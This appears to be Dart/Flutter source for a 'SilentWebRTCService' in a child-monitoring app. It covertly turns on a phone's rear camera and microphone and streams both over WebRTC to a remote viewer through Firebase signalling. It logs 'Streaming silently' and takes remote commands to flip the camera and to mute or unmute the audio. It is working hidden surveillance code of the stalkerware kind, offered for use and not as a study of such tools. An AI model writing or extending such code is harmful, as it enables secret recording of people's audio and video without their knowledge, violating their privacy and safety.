import 'dart:async';
import 'package:flutter/foundation.dart';
import 'package:flutter_webrtc/flutter_webrtc.dart';
import 'package:firebase_database/firebase_database.dart';

class SilentWebRTCService {
  static SilentWebRTCService? _instance;
  static SilentWebRTCService get instance => _instance ??= SilentWebRTCService._();
  SilentWebRTCService._();

  RTCPeerConnection? _pc;
  MediaStream? _localStream;
  bool _active = false;
  String? _activeUid;
  StreamSubscription? _offerSub, _candidateSub, _statusSub, _commandSub;
  bool _answerSet = false;

  static const _ice = {'iceServers': [{'urls': 'stun:stun.l.google.com:19302'},{'urls': 'stun:stun1.l.google.com:19302'}],'sdpSemantics': 'unified-plan'};

  bool get isActive => _active;

  Future<void> startSilentCamera(String childUid) async {
    if (_active && _activeUid == childUid) return;
    await stopSilent();
    _active = true; _activeUid = childUid; _answerSet = false;
    try {
      _pc = await createPeerConnection(_ice);
      _localStream = await navigator.mediaDevices.getUserMedia({'video': {'facingMode': 'environment', 'width': 640, 'height': 480}, 'audio': true});
      for (final t in _localStream!.getTracks()) await _pc!.addTrack(t, _localStream!);
      final db = FirebaseDatabase.instance.ref();
      _pc!.onIceCandidate = (c) { if (c.candidate != null) db.child('calls/$childUid/childCandidates').push().set({'candidate': c.candidate, 'sdpMid': c.sdpMid, 'sdpMLineIndex': c.sdpMLineIndex}); };
      _offerSub = db.child('calls/$childUid/offer').onValue.listen((e) async {
        if (e.snapshot.value == null || _pc == null || _answerSet) return;
        try {
          final d = Map<String, dynamic>.from(e.snapshot.value as Map);
          await _pc!.setRemoteDescription(RTCSessionDescription(d['sdp'], d['type']));
          final ans = await _pc!.createAnswer();
          await _pc!.setLocalDescription(ans);
          await db.child('calls/$childUid/answer').set({'sdp': ans.sdp, 'type': ans.type});
          _answerSet = true;
        } catch (ex) { debugPrint('[SilentWebRTC] $ex'); }
      });
      _candidateSub = db.child('calls/$childUid/parentCandidates').onChildAdded.listen((e) async {
        if (e.snapshot.value == null || _pc == null) return;
        try { final c = Map<String, dynamic>.from(e.snapshot.value as Map); await _pc!.addCandidate(RTCIceCandidate(c['candidate'], c['sdpMid'], c['sdpMLineIndex'])); } catch (_) {}
      });
      _commandSub = db.child('calls/$childUid/command').onValue.listen((e) async {
        final cmd = e.snapshot.value as String?;
        if (cmd == 'flip') { final t = _localStream?.getVideoTracks() ?? []; if (t.isNotEmpty) try { await Helper.switchCamera(t.first); } catch (_) {} }
        if (cmd == 'mute') _localStream?.getAudioTracks().forEach((t) => t.enabled = false);
        if (cmd == 'unmute') _localStream?.getAudioTracks().forEach((t) => t.enabled = true);
      });
      _statusSub = db.child('calls/$childUid/status').onValue.listen((e) async { if (e.snapshot.value == 'ended') await stopSilent(); });
      debugPrint('[SilentWebRTC] Streaming silently');
    } catch (e) { debugPrint('[SilentWebRTC] Error: $e'); _active = false; }
  }

  Future<void> stopSilent() async {
    _active = false; _activeUid = null; _answerSet = false;
    _offerSub?.cancel(); _candidateSub?.cancel(); _statusSub?.cancel(); _commandSub?.cancel();
    _offerSub = null; _candidateSub = null; _statusSub = null; _commandSub = null;
    _localStream?.getTracks().forEach((t) => t.stop());
    await _localStream?.dispose(); await _pc?.close();
    _localStream = null; _pc = null;
  }
}
